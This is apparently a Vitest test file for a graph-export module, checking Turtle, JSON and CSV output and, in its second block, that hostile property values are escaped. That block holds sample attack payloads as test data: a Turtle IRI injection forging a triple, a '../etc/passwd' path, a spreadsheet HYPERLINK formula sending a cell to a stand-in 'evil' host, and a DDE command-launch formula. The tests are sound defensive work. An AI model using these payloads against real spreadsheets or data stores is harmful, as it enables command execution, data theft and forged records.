/**
 * Subgraph export tests, including the requirement's acceptance
 * shape: selected nodes + properties + INTER-edges only.
 *
 * @see specs/02-functional-interaction.md R2.11
 */

import { describe, it, expect } from "vitest";
import { UGM } from "../ugm";
import {
  exportSubgraphTurtle,
  exportSubgraphJson,
  exportSubgraphCsv,
} from "./subgraph-export";

function graph() {
  const ugm = new UGM();
  ugm.addNode("a", {
    types: ["Asset"],
    properties: { name: "Pump A", pressure: 4.2 },
  });
  ugm.addNode("b", {
    types: ["Asset"],
    properties: { name: 'Valve "B"', provenance_iri: "https://ex.org/v1" },
  });
  ugm.addNode("c", { types: ["Site"], properties: { name: "Plant" } });
  ugm.addEdge("a", "b", { type: "feeds", properties: { flow: 3 } });
  ugm.addEdge("b", "c", { type: "locatedAt", properties: {} });
  return ugm;
}

describe("subgraph export (R2.11 slice 1)", () => {
  it("Turtle: selected nodes, their properties, inter-edges only", () => {
    const ttl = exportSubgraphTurtle(graph(), { nodeIds: ["a", "b"] });
    expect(ttl).toContain("g3t:node-a rdf:type g3t:type-Asset .");
    expect(ttl).toContain('g3t:node-a rdfs:label "Pump A" .');
    expect(ttl).toContain("g3t:node-a g3t:prop-pressure 4.2 .");
    expect(ttl).toContain('rdfs:label "Valve \\"B\\""');
    expect(ttl).toContain(
      "g3t:node-b prov:wasDerivedFrom <https://ex.org/v1> .",
    );
    expect(ttl).toContain("g3t:node-a g3t:rel-feeds g3t:node-b .");
    // c excluded; the b->c edge is not an inter-edge of the selection
    expect(ttl).not.toContain("node-c");
    expect(ttl).not.toContain("locatedAt");
  });

  it("empty selection exports the whole graph", () => {
    const json = JSON.parse(exportSubgraphJson(graph()));
    expect(json.nodes).toHaveLength(3);
    expect(json.edges).toHaveLength(2);
  });

  it("CSV: two tables, quoting where needed", () => {
    const csv = exportSubgraphCsv(graph(), { nodeIds: ["a", "b"] });
    const [header] = csv.split("\n");
    expect(header).toBe("id,types,name,pressure,provenance_iri");
    expect(csv).toContain('"Valve ""B"""');
    expect(csv).toContain("id,source,target,type,flow");
  });
});

describe("output encoding at the export sinks", () => {
  /** A graph whose only hostile input is one node property. */
  function withProperty(key: string, value: unknown): UGM {
    const ugm = new UGM();
    ugm.addNode("a", { types: ["Asset"], properties: { [key]: value } });
    return ugm;
  }

  it("Turtle: a provenance IRI cannot close its own bracket", () => {
    // The escape reproduced against the shipped module: end the IRIREF,
    // end the triple, and start one of your own.
    const ttl = exportSubgraphTurtle(
      withProperty(
        "provenance_iri",
        'urn:x> .\n<urn:victim> <http://www.w3.org/2000/01/rdf-schema#label> "forged" .\n<urn:y',
      ),
    );
    // The forged subject and its label never become terms. Asserted on
    // the bracketed forms, since the escaped payload still CONTAINS the
    // substring "urn:victim" and that is fine: it is inside one IRI.
    expect(ttl).not.toContain("<urn:victim>");
    expect(ttl).not.toContain('"forged"');
    // One triple, one line: everything hostile is inside the brackets.
    const emitted = ttl
      .split("\n")
      .filter((l) => l.includes("prov:wasDerivedFrom"));
    expect(emitted).toEqual([
      "g3t:node-a prov:wasDerivedFrom <urn:x%3E%20.%0A%3Curn:victim%3E%20" +
        "%3Chttp://www.w3.org/2000/01/rdf-schema#label%3E%20%22forged%22%20" +
        ".%0A%3Curn:y> .",
    ]);
  });

  it("Turtle: every character Turtle forbids in an IRIREF is escaped", () => {
    const ttl = exportSubgraphTurtle(
      withProperty("provenance_iri", 'urn:x<>"{}|^`\\ y'),
    );
    const [emitted] = ttl
      .split("\n")
      .filter((l) => l.includes("prov:wasDerivedFrom"));
    expect(emitted).toBe(
      "g3t:node-a prov:wasDerivedFrom <urn:x%3C%3E%22%7B%7D%7C%5E%60%5C%20y> .",
    );
  });

  it("Turtle: a value that is not an absolute IRI is dropped, not relativized", () => {
    // Without the scheme check this would emit <../etc/passwd>, which a
    // triplestore resolves against the base into a real subject.
    const ttl = exportSubgraphTurtle(
      withProperty("provenance_iri", "../etc/passwd"),
    );
    // No triple at all, only the comment reporting its absence.
    expect(ttl).not.toContain("prov:wasDerivedFrom <");
    expect(ttl).toContain(
      "# omitted prov:wasDerivedFrom for g3t:node-a: provenance_iri is not an absolute IRI",
    );
    // The rejected value is not echoed, so it cannot break out of the
    // comment it is being reported in.
    expect(ttl).not.toContain("passwd");
  });

  it("Turtle: a well-formed IRI still round-trips unchanged", () => {
    const ttl = exportSubgraphTurtle(
      withProperty("provenance_iri", "https://ex.org/v1#frag?q=1"),
    );
    expect(ttl).toContain(
      "g3t:node-a prov:wasDerivedFrom <https://ex.org/v1#frag?q=1> .",
    );
  });

  it("CSV: guards every character a spreadsheet reads as a formula", () => {
    for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
      const csv = exportSubgraphCsv(withProperty("note", `${lead}cmd`));
      const cell = csv.split("\n")[1]!.split(",")[2]!;
      expect(cell.startsWith("'") || cell.startsWith(`"'`)).toBe(true);
    }
  });

  it("CSV: the DDE and HYPERLINK payloads are inert", () => {
    const csv = exportSubgraphCsv(
      withProperty("note", '=HYPERLINK("https://evil/"&A2,"details")'),
    );
    expect(csv).toContain(`"'=HYPERLINK(""https://evil/""&A2,""details"")"`);
    const dde = exportSubgraphCsv(withProperty("note", "=cmd|'/c calc'!A0"));
    expect(dde).toContain("'=cmd|'/c calc'!A0");
  });

  it("CSV: numbers stay numbers", () => {
    // The guard applies to a leading `-`, so exempting plain numbers is
    // what keeps a negative measurement usable in the spreadsheet this
    // export exists to feed.
    for (const value of [-5, -3.25, -1e-3]) {
      const csv = exportSubgraphCsv(withProperty("delta", value));
      expect(csv.split("\n")[1]).toBe(`a,Asset,${value}`);
    }
    // An expression that merely starts like one is still guarded.
    const csv = exportSubgraphCsv(withProperty("delta", "-1+1"));
    expect(csv.split("\n")[1]).toBe("a,Asset,'-1+1");
  });
});
